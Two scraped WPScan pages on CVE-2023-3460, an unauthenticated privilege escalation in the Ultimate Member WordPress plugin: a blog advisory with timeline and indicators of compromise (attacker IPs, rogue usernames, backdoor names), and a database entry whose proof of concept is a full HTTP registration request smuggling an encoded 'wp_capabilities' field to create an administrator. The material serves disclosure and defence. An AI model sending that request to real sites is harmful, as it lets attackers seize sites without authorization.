=== Content from blog.wpscan.com_f859c6b4_20250114_232232.html ===


* [Features](https://a8cteam5105.wordpress.com/features/)
* [Pricing](https://a8cteam5105.wordpress.com/pricing/)
* Solutions
  + [Status](https://status.wpscan.com/)
  + [API Details](/api)
  + [CLI Scanner](https://a8cteam5105.wordpress.com/wordpress-cli-scanner/)
* Vulnerabilities
  + [Themes](/themes)
  + [WordPress](/wordpresses)
  + [Plugins](/plugins)
  + [Stats](/statistics)
  + [Submit Vulnerabilities](/submit)
  + [Leaderboard](/leaderboard)
* Resources
  + [Blog](/blog)
  + [Enterprise Features](https://a8cteam5105.wordpress.com/enterprise-customers-features/)
  + [How to Install WPScan](https://a8cteam5105.wordpress.com/how-to-install-wpscan/)
  + [WPScan Glossary](/wpscan-glossary)
  + [2024 Website Threat Report](https://wpscan.com/2023-website-threat-report/)

Search

Updated on March 1, 2024August 3, 2023
# Hacking Campaign Actively Exploiting Ultimate Member Plugin

**UPDATE (2023‑07‑03):** A new version, 2.6.7, was released this weekend, and fixes the issue. If you use [Ultimate Member](https://wordpress.org/plugins/ultimate-member/), update to this version as soon as possible. You can find [Ultimate Member’s incident postmortem here](https://docs.ultimatemember.com/article/1866-security-incident-update-and-recommended-actions).

Recently, Automattic’s [WP.cloud](https://wp.cloud/) and [Pressable.com](https://pressable.com/) platforms identified a trend in compromised sites, where rogue new administrator accounts kept appearing in the affected sites. After some investigation, we witnessed a post on the WordPress.org support forums by [Slavic Dragovtev](https://wordpress.org/support/users/madhazelnut/) discussing a potential security issue, specifically [a Privilege Escalation vulnerability](http://wordpress.org/support/topic/possible-priv-esc-vulnerability/), with the [Ultimate Member plugin](https://wordpress.org/plugins/ultimate-member/) (200,000+ active installs). Worryingly, there were indications that this issue was being [actively exploited by malicious actors](https://wordpress.org/support/topic/register-role-ignored-and-user-became-an-admin/).

In response to the vulnerability report, the creators of the plugin promptly released a new version, 2.6.4, intending to fix the problem. However, upon investigating this update, we found numerous methods to circumvent the proposed patch, implying the issue is still fully exploitable.

Adding to the urgency of the situation, a look at our monitoring systems also confirmed attacks using this vulnerability were indeed happening in the wild.

In light of our findings, we immediately contacted the plugin’s authors. We shared our discoveries and offered our assistance to help them resolve the issue as soon as possible.

This is a very serious issue: unauthenticated attackers may exploit this vulnerability to create new user accounts with administrative privileges, giving them the power to take complete control of affected sites.

## Privilege Escalation Vulnerability In Ultimate Member

| **Name** | Ultimate Member |
| --- | --- |
| **Plugin URI** | <https://wordpress.org/plugins/ultimate-member/> |
| **Author** | <https://ultimatemember.com/> |
| **Affected Versions** | Versions lower than 2.6.7 |
| **CVE ID** | [CVE-2023-3460](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-3460) |
| **WPScan ID** | [694235c7-4469-4ffd-a722-9225b19e98d7](https://wpscan.com/vulnerability/694235c7-4469-4ffd-a722-9225b19e98d7) |
| **CVSSv3.1** | [9.8](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |

At the time of writing, there is no complete fix to this issue. Hence, we’ll provide only a brief overview of the reasons the code is vulnerable, and how similar code should be fixed.

The plugin operates by using a pre‑defined list of user metadata keys that users should not manipulate. It uses this list to check if users are attempting to register these keys when creating an account. This is a common security anti‑pattern, where blocking known harmful inputs (blocklists) might seem intuitive, but is trickier than expected and often leaves room for security bypasses.

Instead of blocklists, it’s generally recommended to use allowlists, which approve specific inputs and reject anything that didn’t make it to the list. This typically provides a more robust security measure.

Unfortunately, differences in how the Ultimate Member’s blocklist logic and how WordPress treats metadata keys made it possible for attackers to trick the plugin into updating some it shouldn’t, like “wp\_capabilities”, which is used to store a user’s role and capabilities.

## Indicators of Compromise

We noticed several IP addresses actively attacking sites:

* 13.115.254.242
* 18.183.89.3
* 43.207.157.215
* 52.77.211.128
* 54.204.198.153
* 54.238.232.81
* 73.85.149.184
* 103.30.11.160
* 103.30.41.32
* 103.187.5.128
* 123.148.137.93
* 149.102.246.53
* 154.23.241.178
* 163.123.192.54
* 165.227.120.193
* 169.150.227.217
* 213.232.113.183

The typical attacks we are observing generally involve the following steps:

* An initial POST request is made to the plugin’s user registration page, which is typically “/register.”
* The attacker then attempts to log in with the newly created account using the “/wp‑login.php” page.
* Finally, a malicious plugin is uploaded through the site’s administration panel.

Common usernames for malicious accounts created during the recent attack wave:

* apadmins
* wpadmins
* wpenginer
* segs\_brutal

Other indicators of compromise include malicious plugins, themes, and code additions:

* Malicious plugins such as “yyobang” and backdoors such as “autoload\_one.php” added to legitimate plugins.
* Malicious themes such as “fing.”
* Modifications to the active theme’s functions.php, including attempts to create a persistent user, “wpadminns.”

## Timeline

| **2023-06-04** | Pressable.com / WP.cloud’s monitoring systems first logged attack waves creating accounts with “apadmin” and “wpadmins” usernames |
| --- | --- |
| ****2023-06-26**** | Slavic Dragovtev [reports a potential privilege escalation vulnerability](https://wordpress.org/support/topic/possible-priv-esc-vulnerability/) to Ultimate Member |
| ******2023-06-2****7** | Ultimate Member version 2.6.4 is released, but is still vulnerable |
| ******2023-06-2****7** | [Joshua Goode](https://goode.pro/), representing Pressable.com and WP.cloud, starts an investigation, confirms that a vulnerability is being actively exploited, identifies numerous indicators of compromise, and escalates the issue to the Jetpack & WPScan Security Research team |
| ******2023-06-2****7** | Some plugin users [start noticing attack attempts](https://wordpress.org/support/topic/register-role-ignored-and-user-became-an-admin/) against their sites |
| ******2023-06-2****7** | We report bypasses in the 2.6.4 fix to Ultimate Member’s authors, they quickly reply with a potential (but insufficient) fix |
| **2023-06-28** | Version 2.6.5 is released to the public, but is still exploitable |
| **2023-06-29** | We publish this post |
| **2023-06-29** | Version 2.6.6 is released to the public, but is still exploitable |
| **2023-06-30** | Ultimate Member sends us version 2.6.7 for review |
| **2023-07-01** | Version 2.6.7 is released to the public |
| **2023-07-03** | We confirm with the authors that 2.6.7 fixes the various bypasses we reported to them |

## **Conclusion**

We recommend you update the Ultimate Member plugin to version 2.6.7, which remediates this security issue.

Sites on [WP.cloud](https://wp.cloud/) hosts, such as [WordPress.com](https://WordPress.com) and [Pressable.com](https://pressable.com), have received a platform‑level patch to help mitigate the vulnerability.

We are committed to ensuring your website’s protection against these types of vulnerabilities. It is highly recommended that you implement a security plan for your site that includes scanning for malicious files and maintaining regular backups. [Jetpack offers a comprehensive solution](https://jetpack.com/features/security/) to ensure the safety of your site and its visitors.

### Share this:

* [Twitter](https://wpscan.com/blog/hacking-campaign-actively-exploiting-ultimate-member-plugin/?share=twitter "Click to share on Twitter")
* [Facebook](https://wpscan.com/blog/hacking-campaign-actively-exploiting-ultimate-member-plugin/?share=facebook "Click to share on Facebook")
Like Loading…
## Posted by

![](https://2.gravatar.com/avatar/e593528300d2f78fecde75637ba20ffdcd77b52d9171a9ec19f4d3b85f312db2?s=48&d=identicon&r=G)

[Fioravante Souza](https://wpscan.com/blog/author/fioa8c/)

## Get News and Tips From WPScan

Type your email…

Subscribe

![](https://wpscan.com/wp-content/uploads/2023/10/wpscan-logo-dark.png?w=246)

### Vulnerabilities

* [WordPress](/wordpresses)
* [Plugins](/plugins)
* [Themes](/themes)
* [Our Stats](https://a8cteam5105.wordpress.com/statistics/)
* [Submit vulnerabilities](https://a8cteam5105.wordpress.com/submit/)

#### About

* [How it works](/features)
* [Pricing](/pricing)
* [WordPress plugin](https://wordpress.org/plugins/wpscan/)
* [Blog](/blog)
* [Contact](/contact)

#### For Developers

* [Status](https://status.wpscan.com/)
* [API details](/api)
* [CLI scanner](/wordpress-cli-scanner)

#### Other

* [Privacy](https://automattic.com/privacy/)
* [Terms of service](/terms)
* [Submission terms](/submission-terms/)
* [Disclosure policy](/vulnerability-disclosure-policy)
* [Privacy Notice for California Users](https://automattic.com/privacy/#california-consumer-privacy-act-ccpa)

---

![](https://wpscan.com/wp-content/uploads/2023/08/frame-1323.png?w=48)

In partnership with [Jetpack](https://jetpack.com/)

* [GitHub](https://github.com/wpscanteam/wpscan/)
* [Twitter](https://twitter.com/_wpscan_)
* [Facebook](https://www.facebook.com/WPScan)

---

An

![](https://wpscan.com/wp-content/uploads/2023/08/autpmattic-logo.png?w=298)

endeavor

[Work With Us](https://automattic.com/work-with-us/)

[Press](https://automattic.com/press/)

* Reblog
* Subscribe
  Subscribed

  + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)

  Join 30,404 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Fhacking-campaign-actively-exploiting-ultimate-member-plugin%252F)
* Privacy
* + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Fhacking-campaign-actively-exploiting-ultimate-member-plugin%252F)
  + [Copy shortlink](https://wp.me/pf0jyo-1zH)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://wpscan.com/blog/hacking-campaign-actively-exploiting-ultimate-member-plugin/)
  + [View post in Reader](https://wordpress.com/read/blogs/221720208/posts/6057)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

%d

![](https://pixel.wp.com/b.gif?v=noscript)


=== Content from wpscan.com_0656aa3a_20250114_232233.html ===


[Skip to content](#wp--skip-link--target)

* [Features](https://a8cteam5105.wordpress.com/features/)
* [Pricing](https://a8cteam5105.wordpress.com/pricing/)
* Solutions
  + [Status](https://status.wpscan.com/)
  + [API Details](/api)
  + [CLI Scanner](https://a8cteam5105.wordpress.com/wordpress-cli-scanner/)
* Vulnerabilities
  + [Themes](/themes)
  + [WordPress](/wordpresses)
  + [Plugins](/plugins)
  + [Stats](/statistics)
  + [Submit Vulnerabilities](/submit)
  + [Leaderboard](/leaderboard)
* Resources
  + [Blog](/blog)
  + [Enterprise Features](https://a8cteam5105.wordpress.com/enterprise-customers-features/)
  + [How to Install WPScan](https://a8cteam5105.wordpress.com/how-to-install-wpscan/)
  + [WPScan Glossary](/wpscan-glossary)
  + [2024 Website Threat Report](https://wpscan.com/2023-website-threat-report/)

Search

## WordPress Plugin Vulnerabilities

# Ultimate Member < 2.6.7 - Unauthenticated Privilege Escalation

### Description

The plugin does not prevent visitors from creating user accounts with arbitrary capabilities, effectively allowing attackers to create administrator accounts at will. This is actively being exploited in the wild.

### Proof of Concept

POST /register/ HTTP/1.1
Host: wpscan-vulnerability-test-bench.ddev.site
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/114.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,\*/\*;q=0.8
Accept-Language: en-CA,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 226
Origin: http://wpscan-vulnerability-test-bench.ddev.site
Connection: close
Referer: http://wpscan-vulnerability-test-bench.ddev.site/register/
Cookie: wordpress\_test\_cookie=WP%20Cookie%20check; PHPSESSID=1b8518cf0ecbf8627f460b2b088024d9; wp\_lang=en\_US
Upgrade-Insecure-Requests: 1
user\_login-29=pwnmemayb2e&user\_password-29=P%40ssw0rd%21&confirm\_user\_password-29=P%40ssw0rd%21&first\_name-29=Kaput&wp\_cap%c3%a0Bilities-29[administrator]=1&form\_id=29&um\_request=&\_wpnonce=cde6682afb&\_wp\_http\_referer=%2Fregister%2F

### Affects Plugins

[![Plugin icon](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/plugin-icon.svg)

ultimate-member](https://a8cteam5105.wordpress.com/plugin/ultimate-member/)

![](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/checkmark-green-alt.svg)
Fixed in 2.6.7

### References

CVE
[CVE-2023-3460](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-3460)

URL
<https://blog.wpscan.com/hacking-campaign-actively-exploiting-ultimate-member-plugin/>

### Classification

Type
PRIVESC

OWASP top 10
[A2: Broken Authentication and Session Management](https://www.owasp.org/index.php/Top_10-2017_A2-Broken_Authentication)

CWE
[CWE-269](https://cwe.mitre.org/data/definitions/269.html)

CVSS
[9.8 (critical)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

### Miscellaneous

Original Researcher
Unknown, Marc Montpas

Verified
Yes

WPVDB ID
[694235c7-4469-4ffd-a722-9225b19e98d7](https://a8cteam5105.wordpress.com/vulnerability/694235c7-4469-4ffd-a722-9225b19e98d7/)

### Timeline

Publicly Published
2023-06-29 (about 1 years ago)

Added
2023-06-29 (about 1 years ago)

Last Updated
2023-07-03 (about 1 years ago)

### Other

Published
Title

Published
2023-07-31
Title
[Shop as a Customer for WooCommerce < 1.1.8 - Subscriber+ Privilege Escalation](https://a8cteam5105.wordpress.com/vulnerability/fd121cb9-24e8-4a40-885c-f36b9c8c22ef/)

Published
2016-03-03
Title
[Bulk Delete <= 5.5.3 - Privilege Escalation](https://a8cteam5105.wordpress.com/vulnerability/738aa4ef-f992-4824-a2f7-bdef8ba10144/)

Published
2022-02-01
Title
[MasterStudy LMS < 2.7.6 - Unauthenticated Admin Account Creation](https://a8cteam5105.wordpress.com/vulnerability/173c2efe-ee9c-4539-852f-c242b4f728ed/)

Published
2022-12-01
Title
[ARMember < 5.6 - Unauthenticated Privilege Escalation](https://a8cteam5105.wordpress.com/vulnerability/9afd1de1-3bae-4e57-9082-396141373e43/)

Published
2023-11-23
Title
[Salon booking system < 8.7 - Authenticated (Editor+) Privilege Escalation](https://a8cteam5105.wordpress.com/vulnerability/c57805f7-d037-4941-a947-eee2146c6718/)

![](https://wpscan.com/wp-content/uploads/2023/10/wpscan-logo-dark.png?w=246)

### Vulnerabilities

* [WordPress](/wordpresses)
* [Plugins](/plugins)
* [Themes](/themes)
* [Our Stats](https://a8cteam5105.wordpress.com/statistics/)
* [Submit vulnerabilities](https://a8cteam5105.wordpress.com/submit/)

#### About

* [How it works](/features)
* [Pricing](/pricing)
* [WordPress plugin](https://wordpress.org/plugins/wpscan/)
* [Blog](/blog)
* [Contact](/contact)

#### For Developers

* [Status](https://status.wpscan.com/)
* [API details](/api)
* [CLI scanner](/wordpress-cli-scanner)

#### Other

* [Privacy](https://automattic.com/privacy/)
* [Terms of service](/terms)
* [Submission terms](/submission-terms/)
* [Disclosure policy](/vulnerability-disclosure-policy)
* [Privacy Notice for California Users](https://automattic.com/privacy/#california-consumer-privacy-act-ccpa)

---

![](https://wpscan.com/wp-content/uploads/2023/08/frame-1323.png?w=48)

In partnership with [Jetpack](https://jetpack.com/)

* [GitHub](https://github.com/wpscanteam/wpscan/)
* [Twitter](https://twitter.com/_wpscan_)
* [Facebook](https://www.facebook.com/WPScan)

---

An

![](https://wpscan.com/wp-content/uploads/2023/08/autpmattic-logo.png?w=298)

endeavor

[Work With Us](https://automattic.com/work-with-us/)

[Press](https://automattic.com/press/)

* Subscribe
  Subscribed

  + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)

  Join 30,404 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
* Privacy
* + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://wpscan.com)
  + [View site in Reader](https://wordpress.com/read/feeds/156197069)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

![](https://pixel.wp.com/b.gif?v=noscript)

